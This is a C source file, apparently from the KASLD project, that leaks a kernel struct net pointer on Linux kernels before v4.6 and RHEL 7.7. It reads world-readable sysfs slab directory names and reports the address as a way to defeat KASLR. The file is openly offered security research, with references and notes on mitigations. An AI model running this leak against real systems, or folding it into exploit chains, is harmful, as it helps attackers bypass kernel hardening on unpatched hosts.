// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve a kernel `struct net` pointer (init_net) from a SysFS
// world-readable filename: `/sys/kernel/slab/nf_conntrack_<pointer>`.
//
// Patched in kernel v4.6~2^2~2 on 2016-05-14:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
//
// But still present in RHEL 7.7 as of 2019. Removed in RHEL 7.8 (2020).
//
// Leak primitive:
//   Data leaked:      kernel `struct net` pointer (init_net)
//   Kernel subsystem: net/netfilter — /sys/kernel/slab/ directory names
//   Data structure:   slab cache name containing raw kernel pointer
//   Address type:     virtual (kernel data)
//   Method:           parsed (sysfs directory name parsing)
//   Patched:          v4.6 (commit 31b0b385f69d)
//   Status:           fixed in v4.6 (still present in RHEL 7.7)
//   Access check:     none (world-readable slab cache name in
//                     /sys/kernel/slab/)
//   Source:
//   https://elixir.bootlin.com/linux/v4.5/source/net/netfilter/nf_conntrack_core.c
//
// Mitigations:
//   Patched in v4.6 (pointer removed from slab cache name). Requires
//   CONFIG_NETFILTER=y and CONFIG_NF_CONNTRACK=y/m. /sys/kernel/slab/
//   is world-readable; no runtime sysctl can restrict access.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <dirent.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Before v4.6, the SLAB allocator exposed per-cache sysfs "
    "directories named /sys/kernel/slab/nf_conntrack_<pointer> where "
    "<pointer> was an unobfuscated kernel heap address. This directory "
    "was world-readable. Fixed in v4.6 by removing the pointer from "
    "the directory name.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "discloses:virtual\n"
           "patch:v4.6\n"
           "config:CONFIG_NF_CONNTRACK\n");

static unsigned long get_kernel_addr_conntrack(void) {
  unsigned long addr = 0;
  const char *path = "/sys/kernel/slab/";
  const char *needle = "nf_conntrack_";
  char d_path[256];
  char *substr;
  struct dirent *dir;
  DIR *d;

  kasld_info("trying %snf_conntrack_* ...", path);

  d = kasld_opendir(path);
  if (d == NULL) {
    perror("[-] opendir");
    return 0;
  }

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s", dir->d_name);

    substr = strstr(d_path, needle);

    if (substr == NULL)
      continue;

    if (!kasld_addr_parse(&substr[strlen(needle)], 16, &addr, NULL))
      continue;

    /* A real `struct net *` is pointer-aligned (init_net is a static struct;
     * kmalloc'd namespaces come from the SMP_CACHE_BYTES-aligned net_cachep),
     * so require alignment before trusting the value. Defense in depth: the %p
     * naming predates pointer hashing and was removed in v4.6, so no hashed
     * source exists today, but this keeps the treatment consistent with the
     * other pointer-leak parsers and rejects any misaligned garbage that a
     * future/backported hashing path could produce. */
    if (addr && (addr & (sizeof(void *) - 1)) == 0 &&
        kasld_addr_is_kernel_vas(addr))
      break;

    addr = 0;
  }

  closedir(d);

  return addr;
}

int main(void) {
  /* Pre-check: is /sys/kernel/slab/ readable? */
  if (kasld_access("/sys/kernel/slab/", R_OK) != 0)
    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
                                               : KASLD_EXIT_UNAVAILABLE;

  unsigned long addr = get_kernel_addr_conntrack();
  if (!addr) {
    kasld_err("no kernel address found in sysfs nf_conntrack");
    return 0;
  }

  kasld_found("leaked net struct pointer: %lx", addr);
  /* The leaked value is a `struct net *` (the per-namespace network struct):
   * init_net is static in the kernel image (.data/.bss), other namespaces are
   * kmalloc'd in the direct map. It is NEVER module memory, so do not tag it
   * REGION_MODULE — on MODULES_RELATIVE_TO_TEXT arches (s390, riscv64) that
   * would feed module_text_bound a bogus text-base bound from a non-module
   * address. Classify by range; drop anything that is neither image nor direct
   * map rather than mistag it. */
  /* Which of the two it is cannot be decided by range where the windows
   * overlap: the text window spans the linear map on every VMSPLIT arch and on
   * ppc64, and testing it first tagged a kmalloc'd pointer in lowmem as
   * REGION_KERNEL_DATA — an IMAGE region, so it bounded the image base from a
   * value that is not in the image. kasld_addr_classify() reports that
   * ambiguity; the one thing the source does establish, and range cannot, is
   * that a `struct net *` is never text and never module memory, so an
   * unambiguous image hit is data. */
  enum kasld_region region = kasld_addr_classify(addr);
  if (region == REGION_KERNEL_TEXT)
    region = REGION_KERNEL_DATA;
  if (region == REGION_UNKNOWN || region == REGION_MODULE_BAND) {
    kasld_err("leaked pointer %lx is neither kernel image nor linear map",
              addr);
    return 0;
  }
  kasld_result_sample(KASLD_TYPE_VIRT, region, addr, "nf_conntrack",
                      CONF_PARSED);

  return 0;
}
